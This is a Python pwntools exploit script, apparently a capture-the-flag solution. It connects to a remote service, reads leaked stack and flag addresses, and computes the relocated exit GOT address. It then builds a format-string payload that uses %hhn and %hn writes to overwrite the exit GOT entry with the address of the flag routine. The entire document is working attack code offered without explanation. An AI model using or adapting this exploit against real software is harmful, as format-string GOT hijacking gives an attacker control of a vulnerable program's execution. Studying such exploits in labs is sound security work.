#!/usr/bin/python

from pwn import *
from ctypes import c_uint32

def allign_word(req_n, n):
    print "aligning to " + hex(req_n)
    i = 0
    while (n + i) & 0xffff != req_n:
        i += 1
    n += i
    return i, n

t = remote('endpoint', 1337)

a = 0xf00d
b = 0x1337
c = 0xbad
d = 0x997
exit_got_off = 0x201C
flag_off = 0x670

stack_leak = int(t.recvuntil('\n')[2:-1], 16)
flag_leak = int(t.recvuntil('\n')[2:-1], 16)

stack_addr = c_uint32(stack_leak - a * c).value
flag_addr = c_uint32(flag_leak + b * d).value
relo_offset = flag_addr - flag_off
exit_got_addr = relo_offset + exit_got_off
low_half_addr = stack_addr + 12
high_half_addr = low_half_addr + 2

print "stack leak:\t\t" + hex(stack_addr)
print "relo offset:\t" + hex(relo_offset)
print "flag address:\t" + hex(flag_addr)
print "exit GOT addr:\t" + hex(exit_got_addr)

ppx_off = 3
ppy_off = 5
px_off = 22
py_off = 24
got_ptr_off = 26
n = 0
p = 1
buffer = ''

while p != ppx_off - 1:
    buffer += '%c'
    n += 1
    p += 1
i, n = allign_word(low_half_addr & 0xFFFF, n)
buffer += "%{}c".format(i)
p += 1
buffer += "%hhn"
p += 1

while p != ppy_off - 1:
    buffer += '%c'
    n += 1
    p += 1
i, n = allign_word(high_half_addr & 0xFFFF, n)
buffer += "%{}c".format(i)
p += 1
buffer += "%hhn"
p += 1

while p != px_off - 1:
    buffer += '%c'
    n += 1
    p += 1
i, n = allign_word(exit_got_addr & 0xFFFF, n)
buffer += "%{}c".format(i)
p += 1
buffer += "%hn"
p += 1

while p != py_off - 1:
    buffer += '%c'
    n += 1
    p += 1
i, n = allign_word((exit_got_addr & 0xFFFF0000) >> 16, n)
buffer += "%{}c".format(i)
p += 1
buffer += "%hn"
p += 1

while p != got_ptr_off - 1:
    buffer += '%c'
    n += 1
    p += 1

i, n = allign_word(flag_addr & 0xFFFF, n)
buffer += "%{}c".format(i)
p += 1
buffer += "%hn"
p += 1

t.send((buffer + '\n').ljust(256))
print t.recvall()

